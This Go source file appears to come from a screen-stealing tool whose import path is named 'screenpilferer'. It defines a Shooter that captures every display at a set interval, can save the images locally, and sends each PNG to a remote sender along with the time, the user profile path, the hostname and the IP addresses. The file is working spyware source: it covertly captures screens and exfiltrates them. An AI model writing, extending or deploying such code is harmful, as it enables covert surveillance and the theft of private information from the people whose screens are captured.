package screenshot

import (
	"bytes"
	"fmt"
	"image/png"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/foreverNP/screenpilferer/internal/sender"
	"github.com/kbinani/screenshot"
)

// Shooter makes screenshots and sends them to receiver
// Screenshots are made every duration
type Shooter struct {
	sdr sender.Sender

	duration   time.Duration
	shotsDir   string
	saveToFile bool
}

func NewShooter(d time.Duration, sdr sender.Sender, saveToFile bool) *Shooter {
	return &Shooter{
		sdr:        sdr,
		duration:   d,
		shotsDir:   filepath.Join(os.Getenv("USERPROFILE"), "Pictures", "Screenshots"),
		saveToFile: saveToFile,
	}
}

func (s *Shooter) Start() {
	ticker := time.Tick(s.duration)

	for range ticker {
		n := screenshot.NumActiveDisplays()

		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)

			img, _ := screenshot.CaptureRect(bounds)

			// save to file
			if s.saveToFile {
				fileName := filepath.Join(s.shotsDir, fmt.Sprintf("Screenshot%d.png", time.Now().Unix()))
				file, _ := os.Create(fileName)
				png.Encode(file, img)
			}

			//save to buffer and encode to png
			buffer := new(bytes.Buffer)
			png.Encode(buffer, img)

			hostname, _ := os.Hostname()
			addrs, _ := net.LookupIP(hostname)
			go s.sdr.Send(fmt.Sprintf("time: %v\nuser: %s\nhostname: %s\nserver ip addresses: %v\n",
				time.Now().Format("2006-01-02 15:04:05"), os.Getenv("USERPROFILE"), hostname, addrs),
				buffer.Bytes())
		}
	}
}
